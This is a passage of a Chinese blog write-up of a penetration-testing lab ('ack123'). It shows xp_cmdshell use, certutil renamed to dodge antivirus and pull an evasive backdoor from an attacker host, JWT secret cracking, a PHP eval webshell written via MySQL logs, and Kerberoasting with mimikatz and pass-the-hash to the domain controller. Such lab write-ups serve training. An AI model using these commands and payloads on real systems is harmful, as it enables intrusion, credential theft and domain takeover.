+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> master..xp_cmdshell <span class="string">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021722115.png"></p>
+<p>发现杀软，这个命令在kali上执行是报错的可能是回显太长了？</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021724777.png"></p>
+<p>cs直接生成无文件落地，调用pwershell或者直接使用certutil去下载远程后门，都会被火绒拦截</p>
+<p>解决办法来自这篇文章 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9265">记一次利用mssql上线</a>，这里我直接使用工具MDUT上的com组件方便一点，也需要走代理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Windows\System32\certutil.exe  C:\windows\temp\sethc.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081509650.png"></p>
+<p>生成免杀shell放到kali上，再用python起一个http服务，用刚刚复制的certutil.exe来下载</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yqcs/ZheTian">免杀项目</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Temp\sethc.exe -urlcache -<span class="built_in">split</span> -f <span class="string">&quot;http://192.168.31.54/pMJYrMDKRj.exe&quot;</span> C:\Windows\Temp\loader.exe</span><br></pre></td></tr></table></figure>
+
+<p>运行后门，上线</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Temp\loader.exe</span><br></pre></td></tr></table></figure>
+
+<p>成功bypass火绒上线</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081520743.png"></p>
+<p>粘贴systeminfo信息到在线提权辅助工具，拿到提权可用信息，有的不准自己判断，最后还是试用Erebus插件里的烂土豆提权到system</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081527002.png"></p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081530429.png"></p>
+<p>注入进程到一个x64进程上稳定一下后门，到此已经拿下2台主机，web服务器和数据库服务器，继续横向，继续信息收集</p>
+<h2 id="phpmyadmin-getshell"><a href="#phpmyadmin-getshell" class="headerlink" title="phpmyadmin getshell"></a>phpmyadmin getshell</h2><p>发现存活另一台存活主机（前面没开）</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081639515.png"></p>
+<p>存在80端口，用最开始msf起的socks5代理浏览器访问</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081639116.png"></p>
+<p>登录抓个包，发现熟悉的jwt格式密文</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081643466.png"></p>
+<p>加密需要秘钥</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081711696.png"></p>
+<p>用工具来跑</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ticarpi/jwt_tool.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> jwt_tool</span><br><span class="line"></span><br><span class="line">python3 -m pip install -r requirements.txt</span><br><span class="line"></span><br><span class="line">python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC8xMC4xMC4xLjEzNSIsImF1ZCI6Imh0dHA6XC9cLzEwLjEwLjEuMTM1IiwiaWF0IjoxNjQyMTY0MDA2LCJuYmYiOjE2NDIxNjQwMTYsImV4cCI6MTY0MjE2NDYwNiwiZGF0YSI6eyJ1c2VyaWQiOjEsInVzZXJuYW1lIjoiZGVtbyJ9fQ.mgbBNSJL1MTGep8eJTqfvH-1Zf6F82_Lvp19eGlr0DA -C -d /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>跑出秘钥 Qweasdzxc5</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081726972.png"></p>
+<p>看了公开wp才知道考点在这个响应头，可以google到phpstudy版本，从而得到phpmyadmin路径 url&#x2F;phpmyadmin4.8.5（感觉很无厘头。。）</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081733978.png"></p>
+<p>root&#x2F;Qweasdzxc5 登录成功</p>
+<p>phpmyadmin 日志包含写马</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#查询是否开启日志功能</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span> </span><br><span class="line">#开启日志并修改保存路径</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="string">&#x27;on&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:\\phpstudy_pro\\WWW\\shell.php&#x27;</span>;</span><br><span class="line">#写入shell</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;]); ?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑走代理连接</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081800493.png"></p>
+<p>上线到cs，这台靶机是不出网的，所以上线就要用到转发上线</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081811400.png"></p>
+<p>成功上线cs，提权到system</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081812473.png"></p>
+<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现存在域ack123.com，而且存在两张网卡,域控ip 10.10.10.135</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081814882.png"></p>
+<p>域控、域管理员</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081855883.png"></p>
+<h2 id="kerberost攻击域控"><a href="#kerberost攻击域控" class="headerlink" title="kerberost攻击域控"></a>kerberost攻击域控</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Kerberoast攻击共分为五步</span><br><span class="line"><span class="bullet">1.</span>  SPN发现</span><br><span class="line"><span class="bullet">2.</span>  请求服务票据</span><br><span class="line"><span class="bullet">3.</span>  导出服务票据</span><br><span class="line"><span class="bullet">4.</span>  破解服务服务票据</span><br><span class="line"><span class="bullet">5.</span>  重写服务票据</span><br></pre></td></tr></table></figure>
+
+<p>查询spn服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell setspn -T ack123.com -q */*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081854824.png"></p>
+<p>创建票据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ask /target:mysql/16server-dc1.ack123.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081905241.png"></p>
+<p>列出票据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::list</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081913306.png"></p>
+<p>切到temp目录导出票据</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081912569.png"></p>
+<p>下载下来</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081912705.png"></p>
+<p>使用工具爆破密码<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a> </p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081919411.png"></p>
+<p>根据拿到的密码和前面查询到的域管账号进行hash传递</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081922956.png"></p>
+<p>成功上线dc</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081923356.png"></p>
+<p>在用dc1的域管去横向136那台主机，完事！</p>
+<p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081928171.png"></p>
+
+    </div>
+
+    
+    
+    
+      
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Syst1m
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://syst1m.top/2022/09/28/%E6%9A%97%E6%9C%88ack123%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6/" title="暗月渗透实战靶场项目七">https://syst1m.top/2022/09/28/暗月ack123实战靶场打靶/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/ATT-CK/" rel="tag"># ATT&CK</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+              <a href="/tags/%E5%85%8D%E6%9D%80/" rel="tag"># 免杀</a>
+              <a href="/tags/%E8%BF%87%E7%8B%97/" rel="tag"># 过狗</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/09/14/%E6%9A%97%E6%9C%88%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E9%A1%B9%E7%9B%AE%E4%B8%83/" rel="prev" title="暗月渗透实战靶场项目七">
+                  <i class="fa fa-chevron-left"></i> 暗月渗透实战靶场项目七
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2021 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Syst1m</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
